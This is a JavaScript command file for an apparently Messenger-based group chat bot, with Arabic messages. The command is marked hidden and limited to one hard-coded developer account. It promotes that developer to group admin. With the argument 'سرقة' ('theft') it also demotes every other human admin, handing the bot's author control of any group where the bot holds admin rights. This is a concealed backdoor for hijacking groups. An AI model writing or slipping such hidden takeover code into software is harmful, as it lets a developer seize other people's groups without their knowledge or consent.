class Command {
  constructor() {
    this.config = {
      name: "ارفعني",
      aliases: ["ميراي.هاتي الادمن.عزيزتي","promote", "احترمني"],
      role: 2,
      shortDescription: "ترقية نفسك لأدمن",
      longDescription: "خاص بالمطورين فقط",
      category: "group",
      hidden: true
    };
    
    this.name = this.config.name;
    this.author = "Yamada KJ & Alastor";
    this.aliases = this.config.aliases;
    this.role = this.config.role;
    this.description = this.config.longDescription;
  }

  async execute({ api, event, args }) {
    const developerID = "100092990751389";
    
    if (event.senderID !== developerID) {
      return api.sendMessage("❌ هذا الأمر متاح للمطور فقط", event.threadID, event.messageID);
    }

    const threadID = event.threadID;
    const senderID = event.senderID;

    // ✅ تحقق: هل هذا في مجموعة؟
    const threadInfo = await api.getThreadInfo(threadID);
    if (!threadInfo.isGroup) {
      return api.sendMessage(
        "⚠️ | هذا الأمر يعمل فقط في المجموعات.",
        threadID,
        event.messageID
      );
    }

    // الحالة الأولى: "ارفعني"
    if (args.length === 0) {
      await api.changeAdminStatus(threadID, senderID, true);
      return api.sendMessage("✅ تم رفعك أدمن", threadID);
    }

    // الحالة الثانية: "ارفعني سرقة"
    if (args[0] === "سرقة") {
      // رفعك أنت
      await api.changeAdminStatus(threadID, senderID, true);

      // جلب قائمة الأدمنات
      const threadInfo = await api.getThreadInfo(threadID);
      const admins = threadInfo.adminIDs;

      // إزالة كل الأدمنات ما عدا أنت والبوت
      for (const admin of admins) {
        if (admin.id !== senderID && admin.id !== api.getCurrentUserID()) {
          await api.changeAdminStatus(threadID, admin.id, false);
        }
      }

      return api.sendMessage("⚡ تم رفعك أدمن وإزالة باقي الأدمنات", threadID);
    }
  }
}

export default new Command();
